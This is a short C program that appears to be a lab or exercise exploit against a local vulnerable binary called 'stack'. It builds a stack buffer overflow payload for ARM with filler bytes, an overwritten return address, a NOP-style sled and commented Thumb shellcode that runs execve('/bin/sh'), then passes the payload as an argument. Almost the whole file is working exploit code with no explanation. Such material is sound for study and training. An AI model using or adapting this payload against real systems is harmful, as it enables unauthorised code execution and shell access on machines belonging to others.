#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main( int argc, char ** argv ) {
  char * args[3];
  args[0] = "stack";
  // "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKLLLLLLLLLLLLLLLLMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNOOOOOOOOOOOOOOOOPPPPPPPPPPPPPPPPABCD\x58\xfb\xff\xbe\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90\x49\x40\x92\x40\x0b\x27\x01\xdf/bin/sh"
  args[1] = "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDD"
            "EEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHH"
            "IIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKLLLLLLLLLLLLLLLL"
            "MMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNOOOOOOOOOOOOOOOOPPPPPPPPPPPPPPPP" // buffer
            "ABCD"                          // buffer pointer
            "\x90\xfa\xff\xbe"              // "return" to next instruction
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08\xE1\xA0\x80\x08"
            "\x01\x30\x8f\xe2"              // ADD  R3, PC, #1
            "\x13\xff\x2f\xe1"              // BX	  R3            @ switch to THUMB
            "\x78\x46"                      // MOV  R0, PC
            "\x0c\x30"                      // ADDS	R0, #0xC
            "\xc0\x46"                      // MOV	R8, R8        @ no-op for thumb alignment
            "\x01\x90"                      // STR  R0, [SP, #4]
            "\x49\x40"                      // EOR  R1, R1, R1    @ NULL args
            "\x92\x40"                      // EOR  R2, R2, R2    @ NULL env
            "\x0b\x27"                      // MOVS R7, #0xB      @ syscall 11, execve
            "\x01\xdf"                      // SVC  #1            @ interrupt
            "/bin/sh"; // /bin/sh
            ;
  args[2] = NULL;
  execvp("./stack", args);
  return 0;
}
